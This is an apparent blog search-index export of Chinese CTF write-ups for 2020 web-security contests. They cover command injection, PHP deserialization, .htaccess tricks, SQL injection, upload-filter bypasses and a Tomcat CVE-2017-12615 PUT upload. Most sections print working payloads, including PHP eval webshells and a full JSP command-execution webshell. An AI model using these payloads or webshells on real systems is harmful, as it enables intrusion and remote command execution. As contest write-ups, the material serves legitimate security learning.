<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020年「羊城杯」网络安全大赛</title>
    <url>/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>连接上蚁剑后，发现<code>bbbbbbbbb.txt</code>文件，base64解码保存为图片即可看到flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>源码在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">view-source:http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/Hei_Mao_Jing_Chang.mp3</span><br></pre></td></tr></table></figure>

<p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>原题在：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://neversecure.ca/category/bug-hunting/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/</span><br><span class="line"><span class="comment">#post提交</span></span><br><span class="line">Black-Cat-Sheriff=<span class="number">04</span>b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat+flag.php&amp;White-cat-monitor=%<span class="number">5</span>B%<span class="number">5</span>D</span><br></pre></td></tr></table></figure>

<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在网上可以找到原题：<code>X-NUCA&#39;2019—Ezphp</code></p>
<p>前提知识：</p>
<p><code>php.ini</code>中有两项：</p>
<p>在所有页面的顶部与底部require文件</p>
<ul>
<li><p><code>auto_prepend_file</code> 在页面顶部加载文件</p>
</li>
<li><p><code>auto_append_file</code> 在页面底部加载文件</p>
</li>
</ul>
<p>例如：</p>
<p>将<code>.htaccess</code>这个文件包含进所有的php页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br></pre></td></tr></table></figure>

<p>然后对于<code>stristr()</code>的黑名单过滤直接用反斜杠即可绕过</p>
<p>对于后面拼接进来的<code>&quot;\nHello World&quot;</code>需要用反斜杠转义</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#x27;cat /f&#x27;.&#x27;lag&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p>首先访问<code>robots.txt</code>，提示<code>Disallow: /star1.php/</code>，源代码里有:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!--  小胖说用个不安全的协议从我家才能进ser.php呢！  !--&gt;</span><br></pre></td></tr></table></figure>

<p>不安全协议用<code>http</code>访问：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php</span><br></pre></td></tr></table></figure>

<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>很明显<code>file_put_contents</code>是要写shell进去，并且在内容前加了死亡函数，遂构造链条，这里触发<code>__toString</code>，但是没有地方可以触发，盲猜应该是<code>echo unserialize</code>的反序列入口。构造链如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$GWHT = new GWHT();</span><br><span class="line">$GWHT-&gt;hero = new Yongen();</span><br><span class="line">$GWHT-&gt;hero-&gt;file = &#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;;</span><br><span class="line">$GWHT-&gt;hero-&gt;text = &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;;</span><br><span class="line">$a = serialize($GWHT);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>蚁剑连上在根目录<code>/ffflag</code>即可获得flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10024</span>/sandbox/hrnh1cvpq4bvbm960878icaodb/shell.php</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>

<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>首先用伪协议读取文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</span><br><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure>

<p>源码为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        	die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        echo <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>首先可以用单引号嵌套反引号执行命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=GWHT.php&amp;count=&#x27;`ls &gt; 1.txt`&#x27;</span><br></pre></td></tr></table></figure>

<p>前提知识：</p>
<p>因为过滤了<code>$_POST</code>和<code>$_GET</code>，需要可以用到<code>get_defined_vars()</code>。</p>
<p>打印一个<code>get_defined_vars()</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(1) &#123; [&quot;pass&quot;]=&gt; string(4) &quot;PASS&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>可以看到最外层是一个<code>array</code>，<code>array</code>的第一个值是<code>_GET</code>，如果我们在函数外层嵌套两层pos就可以获取到<code>_GET</code>的值了，下面就相当于一个一句话木马了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(pos(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

<p>然后再写一个<code>post</code>的🐎</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/1.php?a=file_put_contents(&#x27;kkk.php&#x27;, base64_decode(&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;));</span><br></pre></td></tr></table></figure>

<p>又或者用<code>next</code>可以直接连接蚁剑</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(next(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>2020腾讯犀牛鸟网络安全T-Star高校挑战赛</title>
    <url>/2020/07/02/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Gq和hhhm师傅tql</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>考点：前端js验证图片后缀</p>
<p>上传jpg图片后改php后缀forword，内容是一句话木马</p>
<p>在key目录下有key{K735c9f0D7ddc3b9}</p>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>输入框输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;web1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,flag <span class="keyword">from</span> fl4g<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baidu.com | cat  ..&#x2F;key.php</span><br></pre></td></tr></table></figure>

<h2 id="你能爆破吗"><a href="#你能爆破吗" class="headerlink" title="你能爆破吗"></a>你能爆破吗</h2><ul>
<li><p>burpsuite爆破密码账号都是admin，登陆成功会set一个cookie，cookie是用户名的base64。</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-admin<span class="string">&quot;union select 1,(select group_concat(flag) from flag),3-- </span></span><br></pre></td></tr></table></figure>

<ul>
<li>base64</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LWFkbWluInVuaW9uIHNlbGVjdCAxLChzZWxlY3QgZ3JvdXBfY29uY2F0KGZsYWcpIGZyb20gZmxhZyksMy0tIA==</span><br></pre></td></tr></table></figure>

<h2 id="文件包含GetShell"><a href="#文件包含GetShell" class="headerlink" title="文件包含GetShell"></a>文件包含GetShell</h2><p>首先在<code>lfi.txt</code>读到源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">&quot;%s.php&quot;</span>, $file); // only php file can be included</span><br><span class="line">    include($inc);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接用伪协议</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
<li><p>对&lt;?、php、eval等进行了过滤，过滤比较简单直接替换为空，直接双写就能绕过，eval直接利用php对大小写不敏感绕过。</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;php?&lt;?p&lt;?phphp EVAL($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后改.pht的后缀能上传，限制了20kb-100kb的文件大小，和图片混在一起上传即可，连上蚁剑之后在key下发现flag{Aa3c7c37508E40B3}</p>
<h2 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h2><p>题目给hint</p>
<ul>
<li>CVE-2017-12615</li>
</ul>
<p>抓包把GET改为PUT，后面添加jsp加斜杠上传马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT /kawhi.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">012</span>c8bc2.yunyansec.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">77.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">77.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">If-Modified-Since: Thu, <span class="number">20</span> Jun <span class="number">2019</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">08</span> GMT</span><br><span class="line">If-<span class="literal">None</span>-Match: W/<span class="string">&quot;5619-1561024988000&quot;</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Length: <span class="number">666</span></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();<span class="keyword">try</span> &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;<span class="keyword">while</span> ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line">+<span class="string">&quot;\\n&quot;</span>);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;<span class="keyword">return</span> line.toString();&#125;%&gt;&lt;%<span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="string">&quot;&quot;</span>.equals(request.getParameter(<span class="string">&quot;cmd&quot;</span>)))&#123;out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="string">&quot;cmd&quot;</span>))+<span class="string">&quot;&lt;/pre&gt;&quot;</span>);&#125;<span class="keyword">else</span>&#123;out.println(<span class="string">&quot;:-)&quot;</span>);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>查看根目录</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=ls</span><br></pre></td></tr></table></figure>

<p>发现flag文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=cat%20flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h2><p>题目直接给源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">     echo shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>基础知识</strong></p>
<p>详情参考：<a style="text-decoration:none;" class="foo" href="https://xz.aliyun.com/t/2748" target="_blank">传送门</a> 和 <a style="text-decoration:none;" class="foo" href="https://blog.csdn.net/nzjdsds/article/details/102873187" target="_blank">传送门</a></p>
<p>这里的话是限制了7个字符</p>
<p>payload用的是仕廷大佬wp里的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s\ \\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure>

<p>这里的意思我觉得是先构造<code>_</code>，然后利用<code>_</code>去构造出<code>ls -t&gt;y</code>，然后再利用<code>ls -t&gt;y</code>去构造我们的webshell。</p>
<p>webshell</p>
